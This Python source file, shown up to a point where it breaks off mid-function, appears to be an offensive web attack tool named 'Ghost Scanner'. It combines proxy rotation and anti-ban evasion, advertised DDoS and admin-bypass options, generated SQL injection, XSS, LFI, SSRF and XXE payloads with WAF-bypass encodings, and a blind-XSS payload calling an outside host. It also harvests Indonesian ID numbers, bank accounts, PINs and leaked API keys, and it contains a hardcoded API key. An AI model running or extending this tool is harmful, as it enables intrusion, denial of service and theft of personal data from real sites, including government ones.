#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER v4.6 – OMNI TOOLS+ X
- 19 External Tools: Nuclei, Subfinder, httpx, Naabu, Katana, ffuf, sqlmap, Dalfox,
  Amass, dnsx, gau, waybackurls, Arjun, SecretFinder, Interactsh, Nmap, Metasploit,
  Wireshark (tshark), BurpSuite
- 1M+ XSS & SQLi payloads
- Anti-ban (double-layer delay + proxy rotation)
- 3x PoC verification
- Skull banner
- Windows / Kali / Termux / Arch (no WSL required)
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import warnings
import requests
import cloudscraper
from fake_useragent import UserAgent
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import box
from fpdf import FPDF
import io

warnings.filterwarnings('ignore')

# ========== KONFIGURASI ==========
AI_API_KEY = 'cc_A07j2YrgUcJAfx2UuMIi3F3qohhXV3DCADQmfYYhTh0hvpxF'
AI_BASE_URL = 'https://codecraftapi.com/v1'
AI_MODEL = 'claude-opus-5'
PROXYSCRAPE_API = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text'

# ========== BANNER v4.6 ==========
SKULL_ART = r"""
              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
           ▄█████████████████████████▄
         ▄█████████████████████████████▄
        ██████████████████████████████████
       ████████████████████████████████████
      ██████████████████████████████████████
      ██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██████
      ██████  ▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄  ██████
      ██████  ███████       ███████  ██████
      ██████  ███████       ███████  ██████
      ██████  ▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀  ██████
      ██████                         ██████
      ██████       ▄▄▄▄▄▄▄▄▄         ██████
       ██████      ▀▀▀▀▀▀▀▀▀        ██████
        ██████                     ██████
         ██████     ▀▀▀▀▀▀▀     ██████
          ██████               ██████
           ██████             ██████
            ███████████████████████
              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
               ░░░░░░░░░░░░░░░░░░
"""

def show_banner():
    red = "\033[91m"; cyan = "\033[96m"; yellow = "\033[93m"
    white = "\033[97m"; green = "\033[92m"; magenta = "\033[95m"; reset = "\033[0m"
    skull_lines = SKULL_ART.strip('\n').split('\n')
    side_text = [
        "╔═══════════════════════════════════════════════════════════════╗",
        "║            GHOST SCANNER - OMNI TOOLS+ X v4.6                 ║",
        "║                     FINAL EDITION                             ║",
        "╚═══════════════════════════════════════════════════════════════╝",
        "",
        f"   {green}Nama Tools     {reset}: {cyan}Ghost Scanner{reset}",
        f"   {green}Versi          {reset}: {yellow}4.6 OMNI TOOLS+ X{reset}",
        f"   {green}Developer      {reset}: {magenta}ARGA NOT DEV{reset}",
        f"   {green}GitHub         {reset}: {white}github.com/cozyleon00b-dev{reset}",
        "",
        f"   {red}══════════════════════════════════════════════════════════{reset}",
        f"   {green}Tools Integrated (19):{reset}",
        f"     {cyan}Nuclei  Subfinder  httpx  Naabu  Katana  ffuf  sqlmap{reset}",
        f"     {cyan}Dalfox  Amass  dnsx  gau  waybackurls  Arjun  SecretFinder{reset}",
        f"     {cyan}Interactsh  {yellow}Nmap  Metasploit  Wireshark  BurpSuite{reset}",
        "",
        f"   {red}══════════════════════════════════════════════════════════{reset}",
        f"   {green}Platform:{reset} {white}Windows{reset} {cyan}|{reset} {white}Kali{reset} {cyan}|{reset} {white}Termux{reset} {cyan}|{reset} {white}Arch{reset}",
        f"   {red}══════════════════════════════════════════════════════════{reset}",
    ]
    max_lines = max(len(skull_lines), len(side_text))
    for i in range(max_lines):
        left_vis = skull_lines[i] if i < len(skull_lines) else ""
        left = red + left_vis + reset
        right = side_text[i] if i < len(side_text) else ""
        padding = " " * max(0, 42 - len(left_vis))
        print(f"{left}{padding}{right}")
    print()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    clear_screen(); show_banner()
    console = Console()
    help_text = """
[bold cyan]USAGE:[/bold cyan]
  python ghostscanner.py -u <TARGET_URL> [OPTIONS]

[bold yellow]SCAN OPTIONS:[/bold yellow]
  -u, --url URL          Target URL
  -o, --output FILE      Output JSON (default: results.json)
  -v, --verbose          Verbose output
  --quick                Quick scan
  --no-proxy             Disable proxies
  --proxy-list FILE      Load proxies from file
  --validate-proxy       Validate proxies
  --pdf                  Generate PDF report
  --ai                   Enable AI analysis
  --delay N              Delay between requests (default: 0.5)
  --force-admin          Force admin login bypass
  --tools                Run all 19 external tools

[bold yellow]ATTACK OPTIONS:[/bold yellow]
  --dos / --ddos / --syn / --ssl-reneg / --udp
  --threads N  --duration N

[bold green]EXAMPLES:[/bold green]
  python ghostscanner.py -u https://target.com -v --ai --pdf --tools --force-admin
  python ghostscanner.py -u https://target.com --ddos --threads 500 --duration 60
"""
    console.print(Panel(help_text, border_style="cyan", title="[bold white]HELP[/bold white]", padding=(1,2)))
    sys.exit(0)

# ========== UTILITY ==========
def build_url(base, param, payload):
    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)

# ========== GHOST SCANNER CLASS ==========
class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False,
                 quick=False, pdf=False, ai=False, headless=False, delay=0.5, force_admin=False, use_tools=False):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_file = proxy_file
        self.validate_proxy = validate_proxy
        self.quick = quick
        self.pdf = pdf
        self.ai = ai
        self.headless = headless
        self.delay = delay
        self.force_admin = force_admin
        self.use_tools = use_tools
        self.version = "4.6 OMNI TOOLS+ X"
        self.results_scan = {
            "target": "", "domain": "", "domain_category": "",
            "timestamp": datetime.now().isoformat(),
            "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "vulnerabilities": {
                "sql_injection": [], "xss": [], "command_injection": [], "ssti": [],
                "ldap_injection": [], "nosql_injection": [], "xxe": [], "ssrf": [],
                "path_traversal": [], "file_inclusion": [], "open_redirect": [], "csrf": [],
                "deserialization": [], "rce": [], "lfi": [], "rfi": [],
                "sqli_blind": [], "sqli_error": [], "sqli_time": [],
                "xss_dom": [], "xss_stored": [], "xss_reflected": [],
                "xss_context_aware": [], "xss_csp_bypass": [], "xss_mutation": [],
                "business_logic": [], "improper_input_validation": [],
                "mass_assignment": [], "rate_limit": [],
                "deface": [], "login_bypass": [], "wp_activity_log_rce": [],
                "admin_access": [],
                "robots": [], "sitemap": [], "dir_enum": [], "sensitive_files": [],
                "security_headers": [], "waf_detection": [], "cors": [],
                "open_redirect_sneijder": [], "ssl_info": [], "cookie_flags": [],
                "rate_limit_sneijder": [], "csrf_sneijder": [],
                "nuclei": [], "ffuf": [], "sqlmap": [], "dalfox_external": [],
                "secretfinder": [], "interactsh": [],
                "nmap": [], "metasploit": [], "wireshark": [], "burpsuite": []
            },
            "sensitive_data": {
                "nik": [], "npwp": [], "nip": [], "no_rekening": [], "bank": [],
                "emails": [], "phones": [], "whatsapp": [], "pin": [],
                "ktp_links": [], "kk_links": [], "surat_izin_links": [], "pdf_links": [],
                "province_codes": [], "kabupaten_codes": [], "kecamatan_codes": [],
                "api_keys": [], "tokens": [], "passwords": [],
                "jwt_tokens": [], "aws_keys": [], "azure_keys": [], "gcp_keys": [],
                "source_code": []
            },
            "external": {
                "subdomains": [], "dns_records": [], "live_hosts": [],
                "naabu_ports": [], "katana_urls": [], "historical_urls": [],
                "arjun_params": []
            },
            "sql_extracted": {}, "ports": [], "scan_duration": 0,
            "validated": False, "ai_analysis": "", "pocs": [], "admin_data": {},
            "sensitive_pdfs": []
        }
        self.session = requests.Session()
        self.session.verify = False
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
            delay=2, interpreter='native'
        )
        self.proxies = []
        self._load_proxies()
        self.ua = UserAgent()
        self.threads = 500 if not quick else 150
        self.timeout = 10
        self.max_retries = 5
        self.common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
        self.common_params = ['id','page','q','search','user','cat','product','view','sort','filter',
                              'name','email','phone','file','path','redirect','url','next','return',
                              'lang','region','type','mode','action','do','cmd','command','exec',
                              'query','sql','order','by','group','limit','offset','index','idx']
        self._generate_payloads(quick)
        self._generate_waf_bypass()
        self._generate_dalfox_payloads()
        self.result_folder = "results"
        self.sensitive_folder = "sensitive_data"
        os.makedirs(self.result_folder, exist_ok=True)
        os.makedirs(self.sensitive_folder, exist_ok=True)

    # ---------- PROXY ----------
    def _load_proxies(self):
        if not self.use_proxy: return
        if self.proxy_file and os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://', 'https://', 'socks')):
                                line = 'http://' + line
                            self.proxies.append({'http': line, 'https': line})
            except: pass
        try:
            resp = requests.get(PROXYSCRAPE_API, timeout=15)
            if resp.status_code == 200:
                for p in resp.text.strip().split('\n'):
                    p = p.strip()
                    if p:
                        if not p.startswith(('http://', 'https://', 'socks')):
                            p = 'http://' + p
                        self.proxies.append({'http': p, 'https': p})
        except: pass
        seen = set(); unique = []
        for proxy in self.proxies:
            key = proxy.get('http', '')
            if key and key not in seen:
                seen.add(key); unique.append(proxy)
        self.proxies = unique
        if self.validate_proxy: self._validate_proxies()

    def _validate_proxies(self):
        valid = []
        for proxy in self.proxies:
            try:
                if requests.get('https://httpbin.org/ip', proxies=proxy, timeout=5).status_code == 200:
                    valid.append(proxy)
            except: pass
        self.proxies = valid

    def _get_random_proxy(self):
        return random.choice(self.proxies) if self.proxies else None

    def _adaptive_delay(self, factor=1.0):
        """Anti-ban delay v4.6"""
        base = self.delay * factor
        jitter = random.uniform(0.3, 1.5)
        if random.random() < 0.1:
            time.sleep(base * jitter * 3)
        else:
            time.sleep(base * jitter)

    # ---------- PAYLOADS ----------
    def _generate_payloads(self, quick):
        count = 50 if not quick else 15
        cats = ['sql','xss','lfi','rfi','command','ssti','nosql','ldap','xxe','ssrf',
                'sqli_error','sqli_time','sqli_blind','xss_reflected','xss_dom','xss_stored',
                'path_traversal','file_inclusion','deserialization','rce','open_redirect','csrf']
        self.global_payloads = {c: [] for c in cats}
        for p in ['../../../../etc/passwd','/etc/passwd','file:///etc/passwd'][:count]:
            self.global_payloads['lfi'].append(p); self.global_payloads['path_traversal'].append(p)
        for p in [';id','|id','&id','`id`'][:count]:
            self.global_payloads['command'].append(p); self.global_payloads['rce'].append(p)
        for p in ['{{7*7}}','${7*7}'][:count]: self.global_payloads['ssti'].append(p)
        for p in ["{'$ne': ''}","{'$gt': ''}"][:count]: self.global_payloads['nosql'].append(p)
        for p in ['*','admin*'][:count]: self.global_payloads['ldap'].append(p)
        for p in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/'][:count]:
            self.global_payloads['ssrf'].append(p)
        self.global_payloads['xxe'] = ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>']
        self.global_payloads['deserialization'] = ['O:8:"stdClass":0:{}']
        self.global_payloads['open_redirect'] = ['http://evil.com']
        self.global_payloads['csrf'] = []

    def _generate_dalfox_payloads(self):
        self.dalfox_payloads = {
            'html': ['<svg onload=alert(1)>','<img src=x onerror=alert(1)>','<body onload=alert(1)>'],
            'attribute': ['" onmouseover=alert(1) "',"' onfocus=alert(1) '",'" autofocus onfocus=alert(1) "'],
            'javascript': ['";alert(1);//',"';alert(1);//",';alert(1);//'],
            'url': ['javascript:alert(1)','data:text/html,<script>alert(1)</script>'],
            'dom': ['document.write("<img src=x onerror=alert(1)>")','eval("alert(1)")'],
            'csp_bypass': ['<script nonce=test>alert(1)</script>','<base href="javascript:alert(1)//">'],
            'blind': ['<script src="//callback.xss.ht/"></script>']
        }

    def _generate_waf_bypass(self):
        self.waf_bypass_techniques = [
            lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
            lambda p: p.replace(' ', '/**/'), lambda p: urllib.parse.quote(p),
            lambda p: p.replace('script', 'scr%00ipt'), lambda p: p.replace('alert', 'al%00ert')
        ]

    def _generate_sqli_1m(self):
        payloads = set()
        bases = [
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR '1'='1' /*",
            "1' AND '1'='1", "1' AND 1=1--", "1' AND 1=1#",
            "' UNION SELECT NULL--", "' UNION SELECT @@version--",
            "' UNION SELECT database()--", "' AND SLEEP(5)--",
        ]
        encs = [lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
                lambda p: p.replace(' ', '+'), lambda p: p.replace(' ', '%20'),
                lambda p: p.replace(' ', '/**/'), lambda p: urllib.parse.quote(p)]
        for b in bases:
            for e in encs:
                try:
                    p = e(b)
                    if len(p) < 500: payloads.add(p)
                except: pass
        for i in range(1, 1000):
            payloads.add(f"' OR 1={i}--")
            payloads.add(f"' OR {i}={i}--")
            payloads.add(f"1' AND {i}={i}--")
        kws = ["SELECT","UNION","WHERE","FROM","AND","OR"]
        ops = ["=","!=",">","<","LIKE"]
        for kw in kws:
            for op in ops:
                for i in range(20):
                    payloads.add(f"' {kw} 1 {op} {i}--")
        return list(payloads)[:1000000]

    def _generate_xss_1m(self):
        payloads = set()
        tags = ['script','img','svg','body','input','iframe','a','div','math','form','object']
        events = ['onload','onerror','onfocus','onclick','onmouseover','onchange','onsubmit','onblur']
        for tag in tags:
            for event in events:
                payloads.add(f"<{tag} {event}=alert(1)>")
                payloads.add(f"<{tag} {event}=prompt(1)>")
        payloads.add("<script>alert(1)</script>")
        payloads.add("javascript:alert(1)")
        for i in range(1000):
            tag = random.choice(tags); event = random.choice(events)
            payloads.add(f"<{tag} {event}=alert({i})>")
        return list(payloads)[:1000000]

    # ---------- SMART REQUEST ----------
    def _smart_request(self, url, timeout=10, method='GET', data=None, headers=None, allow_redirects=True):
        self._rotate_user_agent()
        self._adaptive_delay(0.3)
        full_headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
        if headers: full_headers.update(headers)
        for attempt in range(self.max_retries):
            try:
                proxy = self._get_random_proxy() if self.proxies else None
                if method.upper() == 'GET':
                    resp = self.scraper.get(url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                elif method.upper() == 'POST':
                    resp = self.scraper.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                else:
                    resp = self.scraper.request(method, url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                if resp.status_code in [429,503,504,408]:
                    self._adaptive_delay(2 ** attempt); continue
                return resp
            except:
                try:
                    proxy = self._get_random_proxy() if self.proxies else None
                    if method.upper() == 'GET':
                        resp = self.session.get(url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                    else:
                        resp = self.session.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                    if resp.status_code < 400: return resp
                except: pass
                if attempt < self.max_retries - 1: self._adaptive_delay(1.5)
        return None

    def _rotate_user_agent(self):
        ua = self.ua.random
        self.session.headers.update({'User-Agent': ua})
        self.scraper.headers.update({'User-Agent': ua})

    # ---------- VERIFY 3x ----------
    def _verify_poc(self, url, initial_response, attempts=3):
        verified = 0
        for i in range(attempts):
            try:
                r = self._smart_request(url, timeout=8)
                if r and r.status_code == 200 and len(r.text) > 0:
                    if abs(len(r.text) - len(initial_response)) < 1000:
                        verified += 1
                time.sleep(self.delay * 0.5)
            except: pass
        return verified >= 2

    # ---------- EXTRACTION ----------
    def _extract_params_from_url(self, url):
        parsed = urlparse(url); params = {}
        if parsed.query:
            for kv in parsed.query.split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1); params[k] = v
        return params

    def _extract_forms(self, html, base_url):
        forms = []
        for form in re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S):
            m = re.search(r'method=["\'](.*?)["\']', form, re.I)
            method = m.group(1).upper() if m else 'GET'
            a = re.search(r'action=["\'](.*?)["\']', form, re.I)
            action = a.group(1) if a else ''
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in re.findall(r'<input[^>]*>', form, re.I):
                n = re.search(r'name=["\'](.*?)["\']', inp, re.I)
                t = re.search(r'type=["\'](.*?)["\']', inp, re.I)
                if n: inputs.append({'name': n.group(1), 'type': t.group(1) if t else 'text'})
            if inputs: forms.append({'method': method, 'url': action_url, 'inputs': inputs})
        return forms

    def _extract_api_endpoints(self, html, base_url):
        endpoints = []
        for pat in [r'href=["\'](.*?api.*?)["\']', r'action=["\'](.*?api.*?)["\']']:
            for m in re.findall(pat, html, re.I):
                u = urljoin(base_url, m)
                if u not in endpoints and u != base_url: endpoints.append(u)
        return endpoints

    def _extract_sensitive_data(self, text):
        data = {k: [] for k in ["nik","npwp","nip","no_rekening","bank","emails","phones",
                                "whatsapp","pin","ktp_links","kk_links","surat_izin_links","pdf_links",
                                "province_codes","kabupaten_codes","kecamatan_codes",
                                "api_keys","jwt_tokens","aws_keys","azure_keys","gcp_keys","source_code"]}
        for nik in set(re.findall(r'\b[0-9]{16}\b', text)):
            data["nik"].append(nik)
            if len(nik) >= 6:
                for code, k in [(nik[:2],"province_codes"),(nik[2:4],"kabupaten_codes"),(nik[4:6],"kecamatan_codes")]:
                    if code not in data[k]: data[k].append(code)
        data["npwp"] = list(set(re.findall(r'\b[0-9]{15}\b', text)))
        data["nip"] = list(set(re.findall(r'\b[0-9]{18}\b', text)))
        data["no_rekening"] = list(set(re.findall(r'\b[0-9]{10,16}\b', text)))
        for bank in ['bca','mandiri','bni','bri','btn','cimb']:
            if bank in text.lower(): data["bank"].append(bank.upper())
        data["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)))
        data["phones"] = list(set(m.group(0) for m in re.finditer(r'(\+62|0)[0-9]{9,13}', text)))
        data["whatsapp"] = [p for p in data["phones"] if 'wa' in text[max(0, text.find(p)-20):text.find(p)+20].lower()]
        for m in re.finditer(r'pin\s*[:=]?\s*([0-9]{4,6})', text, re.I):
            data["pin"].append(m.group(1))
        data["pdf_links"] = list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']', text, re.I)))
        for link in data["pdf_links"]:
            if 'ktp' in link.lower() or 'nik' in link.lower(): data["ktp_links"].append(link)
            if 'kk' in link.lower(): data["kk_links"].append(link)
            if 'izin' in link.lower(): data["surat_izin_links"].append(link)
        api_keys = []
        for pat in [r'sk-[a-zA-Z0-9]{32,}', r'AIza[0-9A-Za-z-_]{35}', r'ghp_[a-zA-Z0-9]{36}', r'AKIA[0-9A-Z]{16}']:
            api_keys.extend(re.findall(pat, text))
        data["api_keys"] = list(set(api_keys))
        data["jwt_tokens"] = [m for m in api_keys if '.' in m and len(m.split('.')) == 3]
        data["source_code"] = [m[:500] for m in re.findall(r'(?:<script>|<style>)(.*?)(?:</script>|</style>)', text, re.I | re.S) if len(m) > 20][:10]
        return data

    # ---------- DOMAIN CLASSIFICATION ----------
    def _classify_domain(self, domain):
        d = domain.lower()
        if d.endswith('.go.id') or '.gov' in d: return 'Government'
        if d.endswith('.ac.id') or d.endswith('.sch.id') or d.endswith('.edu'): return 'Education'
        if 'polri.go.id' in d or 'police' in d: return 'Police'
        if d.endswith('.mil.id') or 'tni' in d: return 'Military'
        if any(x in d for x in ['rs','klinik','hospital','medis']): return 'Medical'
        if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']): return 'Business'
        return 'Other'

    # ========== INTERNAL SCANNERS ==========
    def _check_robots(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/robots.txt'
            resp = self._smart_request(url, timeout=8)
            if resp and resp.status_code == 200 and 'Disallow' in resp.text:
                dis = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
                findings.append({"type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
                                 "evidence": f"Disallowed: {', '.join(dis)}", "risk": "LOW", "confidence": 90,
                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
        except: pass
        return findings

    def _check_sitemap(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/sitemap.xml'
            resp = self._smart_request(url, timeout=8)
            if resp and resp.status_code == 200 and ('<urlset' in resp.text or '<sitemapindex' in resp.text):
                findings.append({"type": "Sitemap Found", "param": "N/A", "payload": "N/A",
                                 "evidence": "Sitemap.xml accessible", "risk": "INFO", "confidence": 90,
                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
        except: pass
        return findings

    def _check_dir_enum(self, target):
        findings = []
        dirs = ["/","/admin","/login","/dashboard","/wp-admin/","/wp-login.php",
                "/phpinfo.php","/api","/uploads","/.git/","/.env","/config"]
        base = target.rstrip('/')
        for d in dirs:
            try:
                url = base + d
                resp = self._smart_request(url, timeout=6)
                if resp and resp.status_code in (200,301,302,401,403):
                    findings.append({"type": f"Dir/File: {d}", "param": "N/A", "payload": "N/A",
                                     "evidence": f"Status {resp.status_code}", 
                                     "risk": "MEDIUM" if resp.status_code in (200,401,403) else "INFO",
                                     "confidence": 85,
                                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:200],
                                             "statusCode": resp.status_code, "timeDiff": "N/A",
                                             "verified": self._verify_poc(url, resp.text, 3)}})
            except: continue
            self._adaptive_delay(0.2)
        return findings

    def _check_sensitive_files(self, target):
        findings = []
        files = ["/.env","/.git/config","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php"]
        base = target.rstrip('/')
        for f in files:
            try:
                url = base + f
                resp = self._smart_request(url, timeout=6)
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    findings.append({"type": f"Sensitive File: {f}", "param": "N/A", "payload": "N/A",
                                     "evidence": f"Accessible | {len(resp.content)} bytes",
                                     "risk": "CRITICAL", "confidence": 95,
                                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                                             "statusCode": resp.status_code, "timeDiff": "N/A",
                                             "verified": self._verify_poc(url, resp.text, 3)}})
            except: continue
            self._adaptive_delay(0.2)
        return findings

    def _check_security_headers(self, target):
        findings = []
        headers = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                   "X-Content-Type-Options","Referrer-Policy","Permissions-Policy"]
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        missing = [h for h in headers if h not in resp.headers]
        if missing:
            findings.append({"type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
                             "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
                             "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
                                     "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_waf(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        waf_signs = [("Cloudflare",["cf-ray"]),("Akamai",["akamai"]),("Sucuri",["x-sucuri-id"]),
                     ("Imperva",["incap_ses"]),("Fastly",["fastly"]),("Varnish",["x-varnish"]),
                     ("AWS/CloudFront",["x-amz-cf-id"])]
        hlower = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items()])
        detected = []
        for name, keys in waf_signs:
            for k in keys:
                if k.lower() in hlower: detected.append(name); break
        if detected:
            findings.append({"type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
                             "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
                             "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
                                     "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_cors_sneijder(self, target):
        findings = []
        test_origin = "https://evil.example"
        resp = self._smart_request(target, timeout=8, headers={"Origin": test_origin})
        if not resp: return findings
        acao = resp.headers.get("Access-Control-Allow-Origin")
        acac = resp.headers.get("Access-Control-Allow-Credentials")
        if acao == "*":
            findings.append({"type": "CORS Wildcard", "param": "N/A", "payload": "N/A",
                             "evidence": "ACAO: *", "risk": "MEDIUM", "confidence": 90,
                             "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
                                     "response": str(resp.headers), "statusCode": resp.status_code,
                                     "timeDiff": "N/A", "verified": True}})
        if acao == test_origin and acac and acac.lower() == "true":
            findings.append({"type": "CORS Reflect + Credentials", "param": "N/A", "payload": "N/A",
                             "evidence": f"Origin reflected: {acao}", "risk": "HIGH", "confidence": 95,
                             "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
                                     "response": str(resp.headers), "statusCode": resp.status_code,
                                     "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_open_redirect_sneijder(self, target):
        findings = []
        p = urlsplit(target)
        base = urlunsplit((p.scheme, p.netloc, p.path, "", ""))
        params = parse_qs(p.query)
        if not params: return findings
        keys = ["next","url","return","redirect","dest","goto"]
        for k in params.keys():
            if k.lower() in keys:
                items = [(k, "http://example.com")]
                test_url = base + "?" + urlencode(items)
                resp = self._smart_request(test_url, timeout=6, allow_redirects=False)
                if resp and resp.status_code in (301,302,303,307,308):
                    loc = resp.headers.get("Location", "")
                    if loc.startswith("http://example.com"):
                        findings.append({"type": "Open Redirect", "param": k, "payload": "http://example.com",
                                         "evidence": f"Redirect to {loc}", "risk": "MEDIUM", "confidence": 90,
                                         "poc": {"url": test_url, "curl": f"curl -k \"{test_url}\"",
                                                 "response": str(resp.headers), "statusCode": resp.status_code,
                                                 "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_ssl_info(self, target):
        findings = []
        try:
            domain = urlparse(target).netloc.split(':')[0]
            ctx = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        findings.append({"type": "SSL Certificate Info", "param": "N/A", "payload": "N/A",
                                         "evidence": f"Subject: {cert.get('subject')}", "risk": "INFO",
                                         "confidence": 100,
                                         "poc": {"url": target, "curl": f"openssl s_client -connect {domain}:443",
                                                 "response": str(cert), "statusCode": 200,
                                                 "timeDiff": "N/A", "verified": True}})
        except: pass
        return findings

    def _check_cookie_flags(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        cookies = resp.headers.get('Set-Cookie', '')
        if cookies:
            flags = []
            if 'Secure' not in cookies: flags.append('Secure')
            if 'HttpOnly' not in cookies: flags.append('HttpOnly')
            if 'SameSite' not in cookies: flags.append('SameSite')
            if flags:
                findings.append({"type": "Insecure Cookie Flags", "param": "N/A", "payload": "N/A",
                                 "evidence": f"Missing: {', '.join(flags)}", "risk": "MEDIUM", "confidence": 85,
                                 "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": cookies,
                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_rate_limit_sneijder(self, target):
        findings = []
        success = 0
        for i in range(10):
            resp = self._smart_request(target, timeout=4)
            if resp and resp.status_code < 400: success += 1
            time.sleep(0.1)
        if success >= 8:
            findings.append({"type": "No Rate Limit", "param": "N/A", "payload": "N/A",
                             "evidence": f"{success}/10 succeeded", "risk": "MEDIUM", "confidence": 80,
                             "poc": {"url": target, "curl": f"for i in {{1..10}}; do curl -s \"{target}\"; done",
                                     "response": f"{success} succeeded", "statusCode": 200,
                                     "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_csrf_sneijder(self, target, forms):
        findings = []
        for form in forms:
            if form.get('method') == 'POST':
                has_token = any(any(x in i['name'].lower() for x in ['csrf','xsrf','token','authenticity']) for i in form.get('inputs', []))
                if not has_token:
                    findings.append({"type": "CSRF Token Missing", "param": "N/A", "payload": "N/A",
                                     "evidence": f"POST form at {form['url']} no CSRF token",
                                     "risk": "MEDIUM", "confidence": 85,
                                     "poc": {"url": form['url'], "curl": f"curl -X POST \"{form['url']}\"",
                                             "response": "No CSRF token", "statusCode": 200,
                                             "timeDiff": "N/A", "verified": True}})
        return findings

    def _check_deface(self, url):
        findings = []
        try:
            resp = self._smart_request(url, timeout=8)
            if not resp: return findings
            html_lower = resp.text.lower()
            title_m = re.search(r'<title>(.*?)</title>', resp.text, re.I)
            title = title_m.group(1) if title_m else 'No Title'
            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d']
            found = [i for i in indicators if i in html_lower]
            if found:
                findings.append({"type": "Deface Detection", "param": "N/A", "payload": "N/A",
                                 "evidence": f"Indicators: {', '.join(found)}", "risk": "CRITICAL", "confidence": 95,
                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
                                         "statusCode": resp.status_code, "timeDiff": "N/A",
                                         "verified": self._verify_poc(url, resp.text, 3)},
                                 "title": title, "indicators": found})
        except: pass
        return findings

    def _check_wp_activity_log(self, target):
        findings = []
        try:
            if not target.startswith(('http://', 'https://')): target = 'https://' + target
            target = target.rstrip('/')
